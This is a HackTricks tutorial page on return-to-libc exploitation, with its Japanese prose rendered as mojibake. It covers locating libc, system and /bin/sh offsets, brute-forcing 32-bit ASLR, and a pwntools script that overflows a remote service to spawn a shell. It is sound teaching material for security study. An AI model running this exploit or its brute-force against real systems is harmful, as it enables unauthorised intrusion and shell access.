# Ret2lib

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **åŸºæœ¬æƒ…å ±**

**Ret2Libc**ã®æœ¬è³ªã¯ã€è„†å¼±ãªãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®å®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã‚’æ”»æ’ƒè€…ãŒæä¾›ã—ãŸã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã§å®Ÿè¡Œã™ã‚‹ã®ã§ã¯ãªãã€å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã®é–¢æ•°ï¼ˆä¾‹ï¼š**system**ã€**execve**ã€**strcpy**ï¼‰ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã™ã‚‹ã“ã¨ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç›®çš„ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªé–¢æ•°ã‚’æŒ‡ã™ã‚ˆã†ã«å¤‰æ›´ã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã—ã€å‘¼ã³å‡ºã—è¦ç´„ã«å¾“ã£ã¦å¿…è¦ãªå¼•æ•°ãŒæ­£ã—ãè¨­å®šã•ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

### **ä¾‹ã®æ‰‹é †ï¼ˆç°¡ç•¥åŒ–ï¼‰**

* å‘¼ã³å‡ºã™é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆä¾‹ï¼šsystemï¼‰ã¨å‘¼ã³å‡ºã™ã‚³ãƒãƒ³ãƒ‰ï¼ˆä¾‹ï¼š/bin/shï¼‰ã‚’å–å¾—ã™ã‚‹
* ã‚³ãƒãƒ³ãƒ‰æ–‡å­—åˆ—ã‚’æŒ‡ã™æœ€åˆã®å¼•æ•°ã¨é–¢æ•°ã¸ã®å®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã‚’æ¸¡ã™ROPãƒã‚§ãƒ¼ãƒ³ã‚’ç”Ÿæˆã™ã‚‹

## ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ç‰¹å®š

* ä½¿ç”¨ã™ã‚‹`libc`ãŒç¾åœ¨ã®ãƒã‚·ãƒ³ã®ã‚‚ã®ã§ã‚ã‚‹ã¨ä»®å®šã™ã‚‹ã¨ã€ãƒ¡ãƒ¢ãƒªã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹å ´æ‰€ã‚’æ¬¡ã®ã‚ˆã†ã«ã—ã¦è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

libcã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒASLRã«ã‚ˆã£ã¦å¤‰æ›´ã•ã‚Œã¦ã„ã‚‹ã‹ç¢ºèªã—ãŸã„å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ã§ãã¾ã™:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹libcã‚’çŸ¥ã£ã¦ã„ã‚Œã°ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§`system`é–¢æ•°ã¸ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹libcã‚’çŸ¥ã£ã¦ã„ã‚Œã°ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¦`/bin/sh`é–¢æ•°ã¸ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEFã®ä½¿ç”¨

ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹libcã‚’çŸ¥ã£ã¦ã„ã‚‹ã¨ã€Pedaã‚„GEFã‚’ä½¿ç”¨ã—ã¦**system**é–¢æ•°ã€**exit**é–¢æ•°ã€ãŠã‚ˆã³æ–‡å­—åˆ—**`/bin/sh`**ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/mapsã®ä½¿ç”¨

ãƒ—ãƒ­ã‚»ã‚¹ãŒã‚ãªãŸã¨è©±ã™ãŸã³ã«**å­ãƒ—ãƒ­ã‚»ã‚¹**ã‚’ä½œæˆã—ã¦ã„ã‚‹å ´åˆï¼ˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒãƒ¼ï¼‰ã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**èª­ã¿å–ã‚‹**ã“ã¨ã‚’è©¦ã¿ã¦ãã ã•ã„ï¼ˆãŠãã‚‰ãrootæ¨©é™ãŒå¿…è¦ã§ã™ï¼‰ã€‚

ã“ã“ã§ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹å†…ã§**libcãŒã©ã“ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹ã‹**ã€ãŠã‚ˆã³ãƒ—ãƒ­ã‚»ã‚¹ã®ã™ã¹ã¦ã®å­ãƒ—ãƒ­ã‚»ã‚¹ã«å¯¾ã—ã¦**ã©ã“ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã‹**ã‚’æ­£ç¢ºã«è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](<../../../../.gitbook/assets/image (95).png>)

ã“ã®å ´åˆã€**0xb75dc000**ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã¾ã™ï¼ˆã“ã‚ŒãŒlibcã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ãªã‚Šã¾ã™ï¼‰ã€‚

## ä¸æ˜ãªlibc

ãƒã‚¤ãƒŠãƒªãŒãƒ­ãƒ¼ãƒ‰ã—ã¦ã„ã‚‹**libcã‚’çŸ¥ã‚‰ãªã„**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼ˆã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã‚µãƒ¼ãƒãƒ¼ã«ã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚ãã®å ´åˆã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦**ã„ãã¤ã‹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã—ã€ã©ã®libc**ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

ã“ã‚Œã«é–¢ã—ã¦ã¯ã€pwntoolsã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## 32ãƒ“ãƒƒãƒˆã§ã®ASLRã®å›é¿

ã“ã‚Œã‚‰ã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã¯**32ãƒ“ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ã«ã®ã¿æœ‰åŠ¹**ã§ã™ã€‚

* ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒãƒ­ãƒ¼ã‚«ãƒ«ã§ã‚ã‚‹å ´åˆã€libcã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã“ã¨ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ32ãƒ“ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ã«æœ‰ç”¨ï¼‰ï¼š
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ã‚’æ”»æ’ƒã™ã‚‹å ´åˆã€**`libc`é–¢æ•°`usleep`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹**ã“ã¨ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å¼•æ•°ã¨ã—ã¦10ã‚’æ¸¡ã—ã¾ã™ï¼ˆä¾‹ãˆã°ï¼‰ã€‚ã‚‚ã—ã‚ã‚‹æ™‚ç‚¹ã§**ã‚µãƒ¼ãƒãƒ¼ãŒå¿œç­”ã™ã‚‹ã®ã«10ç§’ä½™åˆ†ã«ã‹ã‹ã‚‹**å ´åˆã€ã“ã®é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ãŸã“ã¨ã«ãªã‚Šã¾ã™ã€‚

## One Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib ã‚³ãƒ¼ãƒ‰ä¾‹

ã“ã®ä¾‹ã§ã¯ã€ASLRãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ãŒã‚³ãƒ¼ãƒ‰ã«çµ±åˆã•ã‚Œã¦ãŠã‚Šã€è„†å¼±ãªãƒã‚¤ãƒŠãƒªãŒãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ã«ã‚ã‚Šã¾ã™ï¼š
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib ã‚³ãƒ¼ãƒ‰ä¾‹

ä»¥ä¸‹ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (ã¾ãŸã¯ puts)

ã“ã‚Œã¯ã€ç‰¹å®šã®ãƒ‡ãƒ¼ã‚¿ã‚’å¼•æ•°ã¨ã—ã¦æ¸¡ã™ã“ã¨ã§ã€**ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

## Ret2printf

ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€`ret2lib`ã‚’ä½¿ç”¨ã—ã¦printfã‚’å‘¼ã³å‡ºã—ã€æ‚ªç”¨ã™ã‚‹å€¤ã‚’æ¸¡ã™ã“ã¨ã§ã€**Ret2libã‚’`printf`ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®è„†å¼±æ€§ã«å¤‰æ›ã™ã‚‹**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ï¼ˆç„¡é§„ã«æ€ãˆã‚‹ãŒå¯èƒ½ã§ã™ï¼‰:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## ãã®ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2libã€libcå†…ã®é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã«ã€one gadgetã‚’ä½¿ç”¨
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64ãƒ“ãƒƒãƒˆã€ASLRãŒæœ‰åŠ¹ã ãŒPIEãªã—ã€æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã‚«ãƒŠãƒªã‚¢ã®ãƒã‚¤ãƒˆ0x00ã¾ã§ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’åŸ‹ã‚ã¦ã‹ã‚‰putsã‚’å‘¼ã³å‡ºã—ã€æ¼æ´©ã•ã›ã‚‹ã€‚ã‚«ãƒŠãƒªã‚¢ã‚’ä½¿ã£ã¦ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½œæˆã—ã€putsã‚’å‘¼ã³å‡ºã—ã¦GOTã‹ã‚‰putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¼æ´©ã•ã›ã€ãã®å¾Œ`system('/bin/sh')`ã‚’å‘¼ã³å‡ºã™ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½œæˆã€‚
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64ãƒ“ãƒƒãƒˆã€ASLRãŒæœ‰åŠ¹ã€ã‚«ãƒŠãƒªã‚¢ãªã—ã€å­é–¢æ•°ã‹ã‚‰ã®ãƒ¡ã‚¤ãƒ³ã§ã®ã‚¹ã‚¿ãƒƒã‚¯ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã€‚ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½¿ã£ã¦putsã‚’å‘¼ã³å‡ºã—ã€GOTã‹ã‚‰putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¼æ´©ã•ã›ã€ãã®å¾Œone gadgetã‚’å‘¼ã³å‡ºã™ã€‚
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64ãƒ“ãƒƒãƒˆã€PIEãªã—ã€ã‚«ãƒŠãƒªã‚¢ãªã—ã€relroãªã—ã€nxã€‚writeé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦writeï¼ˆlibcï¼‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¼æ´©ã•ã›ã€one gadgetã‚’å‘¼ã³å‡ºã™ã€‚

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„!
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
